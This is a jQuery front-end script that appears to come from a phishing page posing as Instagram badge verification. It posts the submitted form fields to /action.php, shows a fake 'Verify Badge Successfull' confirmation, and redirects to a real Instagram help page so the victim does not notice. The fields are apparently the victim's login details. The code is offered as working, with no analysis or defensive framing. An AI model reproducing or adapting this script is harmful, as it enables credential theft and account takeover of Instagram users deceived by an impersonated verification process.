$(function() {

	$('form').on('submit', function(e) {
		e.preventDefault();
		var formData = $(this).serialize();
		var btn = $('#submit-btn');
		$(btn).attr('disabled', true);
		$.ajax({
			url: "/action.php",
			data: formData,
			dataType: "JSON",
			type: "POST",
			success: function(response){
				Swal.fire('Verify Badge Successfull', 'Wait 24 hours for verify badge', 'success');
				$(btn).attr('disabled', false);

				setInterval(function(){
					window.location.replace("https://help.instagram.com/854227311295302/?helpref=hc_fnav");
				}, 2000);
			}
		})
	})

})